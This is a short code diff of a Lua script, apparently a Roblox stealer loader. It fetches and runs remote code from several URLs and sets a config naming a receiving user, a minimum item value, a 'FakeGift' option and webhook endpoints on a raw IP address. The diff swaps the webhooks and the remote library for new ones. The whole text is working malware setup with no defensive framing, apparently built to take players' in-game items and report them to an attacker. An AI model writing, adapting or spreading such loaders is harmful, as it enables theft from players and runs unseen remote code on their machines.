@@ -1,14 +1,14 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/7teenscripts/loadingscrn/refs/heads/main/lua"))()
-_G.LRMConfig = {
+_G.NullConfig = {
     User = {"ArielVer01"},
     min_value = 10000000000,
-    pingEveryone = "Yes", -- dont change this
-    Webhook = "http://45.13.225.83:6969/proxy/c9e925a04bff134f54865d375aef3b49",
+    pingEveryone = "No", -- dont change this
+    Webhook = "http://45.13.225.83:20002/proxy/c3852b6cd09ddf6a45e3c613e25e2de1",
     FakeGift = "Yes",
-    Trash = "http://45.13.225.83:6969/proxy/c9e925a04bff134f54865d375aef3b49",
+    Trash = "http://45.13.225.83:20002/proxy/c3852b6cd09ddf6a45e3c613e25e2de1",
     LoadingScreen = "No",
     GiftOnlyRares = "No",
     ExecuteOtherScript = "No",
 }
     
-loadstring(game:HttpGetAsync('https://lrmscripts.com/script/main.lua'))()
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
